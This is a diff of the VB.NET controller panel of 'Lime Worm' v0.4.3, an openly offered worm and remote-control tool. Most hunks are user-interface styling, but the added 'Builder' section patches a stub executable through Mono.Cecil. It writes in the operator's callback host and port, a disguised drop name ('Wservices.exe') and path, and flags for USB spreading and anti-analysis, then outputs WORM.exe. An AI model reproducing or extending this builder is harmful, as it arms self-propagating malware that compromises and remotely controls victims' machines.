@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on MAR./20/2018        ##
+'##        N Y A N   C A T  |||   Updated on MAR./26/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.4.2 ..                   ##
+'##                     .. Lime Worm v0.4.3 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -35,6 +35,9 @@
 
 
 
+
+Imports Mono.Cecil
+Imports Mono.Cecil.Cil
 
 Public Class Form1
     Public WithEvents S As Listner
@@ -56,7 +59,7 @@ Public Class Form1
 
     Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
         Control.CheckForIllegalCrossThreadCalls = False
-
+        ContextMenuStrip1.Renderer = New MyRenderer()
         Try
             MYPORT = InputBox("Hello " + Environment.UserName + " , Select Port", "", My.Settings.port)
             If Not MYPORT = Nothing Then
@@ -68,7 +71,7 @@ Public Class Form1
             End
         End Try
 
-        Me.Text = "Lime Worm v0.4.2A"
+        Me.Text = "Lime Worm v0.4.3"
 
         Try
             If Not IO.Directory.Exists(Application.StartupPath + "\" + "Wallpaper") Then
@@ -83,8 +86,12 @@ Public Class Form1
                 My.Resources.Lime_s_wallpaper.Save(Application.StartupPath + "\" + "Wallpaper" + "\" + "Lime's wallpaper.jpg", Imaging.ImageFormat.Jpeg)
             End If
         Catch ex As Exception
-
         End Try
+
+        EXE.Enabled = False
+        PATH1.Enabled = False
+        DROP.Checked = False
+        PATH2.Enabled = False
 
     End Sub
 #End Region
@@ -362,23 +369,26 @@ Public Class Form1
     End Sub
 
     Private Sub ListBox1_DrawItem(sender As System.Object, e As System.Windows.Forms.DrawItemEventArgs) Handles L2.DrawItem
-        e.DrawBackground()
+        Try
+            e.DrawBackground()
 
-        If L2.Items(e.Index).ToString.Contains("Connected") Then
-            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Lime, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
+            If L2.Items(e.Index).ToString.Contains("Connected") Then
+                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Lime, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
 
-        ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
-            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.DarkRed, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
+            ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
+                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.DarkRed, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
 
-        ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
-            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Red, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
+            ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
+                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Red, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
 
-        ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
-            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.LightSteelBlue, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
-        Else
-            e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.White, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
-        End If
-        e.DrawFocusRectangle()
+            ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
+                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.LightSteelBlue, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
+            Else
+                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.White, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
+            End If
+            e.DrawFocusRectangle()
+        Catch ex As Exception
+        End Try
     End Sub
 
     Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
@@ -509,16 +519,23 @@ Public Class Form1
         Using br = New Drawing.SolidBrush(Drawing.Color.Black)
             e.DrawBackground()
             e.Graphics.FillRectangle(br, e.Bounds)
-            Dim headerFont As New Drawing.Font("Microsoft Sans Serif", 8, Drawing.FontStyle.Bold)
-            e.Graphics.DrawString(e.Header.Text, headerFont, Drawing.Brushes.Lime, e.Bounds)
+            Dim headerFont As New Font("Microsoft Sans Serif", 8, FontStyle.Bold)
+            e.Graphics.DrawString(e.Header.Text, headerFont, Brushes.Lime, e.Bounds)
         End Using
     End Sub
 
     Private Sub L1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L1.DrawItem
-        e.DrawDefault = True
-        If (e.ItemIndex Mod 2) = 1 Then
-            e.Item.BackColor = Drawing.Color.Black
-            e.Item.UseItemStyleForSubItems = True
+        If e.Item.Selected = False Then
+            e.DrawDefault = True
+        End If
+    End Sub
+
+    Private Sub ListViewQuote_DrawSubItem(sender As Object, e As DrawListViewSubItemEventArgs) Handles L1.DrawSubItem
+        If e.Item.Selected = True Then
+            e.Graphics.FillRectangle(New SolidBrush(Color.Lime), e.Bounds)
+            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, New Font("Microsoft Sans Serif", 9, FontStyle.Regular), New Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.Black)
+        Else
+            e.DrawDefault = True
         End If
     End Sub
 
@@ -566,6 +583,19 @@ Public Class Form1
         L1.Sort()
         Fix()
     End Sub
+
+    Public Class MyRenderer
+        Inherits ToolStripProfessionalRenderer
+        Protected Overloads Overrides Sub OnRenderMenuItemBackground(ByVal e As ToolStripItemRenderEventArgs)
+            Dim rc As New Rectangle(Point.Empty, e.Item.Size)
+            Dim c As Color = IIf(e.Item.Selected, Color.DarkGreen, Color.Black)
+            Using brush As New SolidBrush(c)
+                e.Graphics.FillRectangle(brush, rc)
+            End Using
+        End Sub
+    End Class
+
+
 #End Region
 
 
@@ -604,10 +634,6 @@ Public Class Form1
             End If
         Catch ex As Exception
         End Try
-    End Sub
-
-    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
-        Builder.Show()
     End Sub
 
     Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
@@ -678,11 +704,120 @@ Public Class Form1
             S.Send(x.Tag, "OFM")
         Next
     End Sub
+#End Region
 
 
+#Region "Builder"
+    Private Sub ChButton1_Click(sender As Object, e As EventArgs) Handles ChButton1.Click
+
+        If (EXE.Text = "") Then
+            EXE.Text = "Wservices.exe"
+        End If
+
+        If PATH1.Text = "" Then
+            PATH1.Text = "Temp"
+        End If
+
+        If Not EXE.Text.EndsWith(".exe") Then
+            EXE.Text = EXE.Text + ".exe"
+        End If
+
+        If (PATH2.Text = "") Then
+            PATH2.Text = Nothing
+        End If
+
+        If Not IO.File.Exists((Application.StartupPath & "\Stub\stub.exe")) Then
+            Interaction.MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
+            Return
+        ElseIf (HOST1.Text = "") Then
+            Interaction.MsgBox("Enter DNS - IP", MsgBoxStyle.Critical, Nothing)
+            Return
+        ElseIf (PORT.Text = "") Then
+            Interaction.MsgBox("Enter Port", MsgBoxStyle.Critical, Nothing)
+            Return
+        Else
+            Try
+                Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\stub.exe"))
+                Dim definition2 As ModuleDefinition
+                For Each definition2 In definition.Modules
+                    Dim definition3 As TypeDefinition
+                    For Each definition3 In definition2.Types
+                        Dim definition4 As MethodDefinition
+                        For Each definition4 In definition3.Methods
+                            If (definition4.IsConstructor AndAlso definition4.HasBody) Then
+                                Dim enumerator As IEnumerator(Of Instruction)
+                                Try
+                                    enumerator = definition4.Body.Instructions.GetEnumerator
+                                    Do While enumerator.MoveNext
+                                        Dim current As Instruction = enumerator.Current
+                                        If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
+                                            Dim str As String = current.Operand.ToString
+                                            If (str = "%HOST1%") Then
+                                                current.Operand = HOST1.Text
+                                            End If
+                                            If (str = "%HOST2%") Then
+                                                current.Operand = HOST2.Text
+                                            End If
+                                            If (str = "%PORT%") Then
+                                                current.Operand = PORT.Text
+                                            End If
+                                            If (str = "%EXE%") Then
+                                                current.Operand = EXE.Text
+                                            End If
+                                            If (str = "%DROP%") Then
+                                                current.Operand = DROP.Checked.ToString
+                                            End If
+                                            If (str = "%PATH1%") Then
+                                                current.Operand = PATH1.Text
+                                            End If
+                                            If (str = "%PATH2%") Then
+                                                current.Operand = PATH2.Text
+                                            End If
+                                            If (str = "%USB%") Then
+                                                current.Operand = USB_CHK.Checked.ToString
+                                            End If
+                                            If (str = "%ANTI%") Then
+                                                current.Operand = ANTI.Checked.ToString
+                                            End If
+                                        End If
+                                    Loop
+                                Finally
+                                End Try
+                            End If
+                        Next
+                    Next
+                Next
+
+                definition.Write(Application.StartupPath + "\" + "WORM.exe")
+                MsgBox("Your Worm Has been Created Successfully", vbInformation, "DONE!")
+                My.Settings.Save()
+                Me.Close()
+            Catch ex1 As Exception
+                MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
+                Return
+            End Try
+        End If
+    End Sub
+
+    Private Sub DROP_CheckedChanged(sender As Object) Handles DROP.CheckedChanged
+
+        If DROP.Checked = True Then
+            EXE.Enabled = True
+            PATH1.Enabled = True
+            PATH2.Enabled = True
+        Else
+            EXE.Enabled = False
+            PATH1.Enabled = False
+            PATH2.Enabled = False
+        End If
+    End Sub
 
 
 #End Region
+
+
+
+
 
 
 End Class
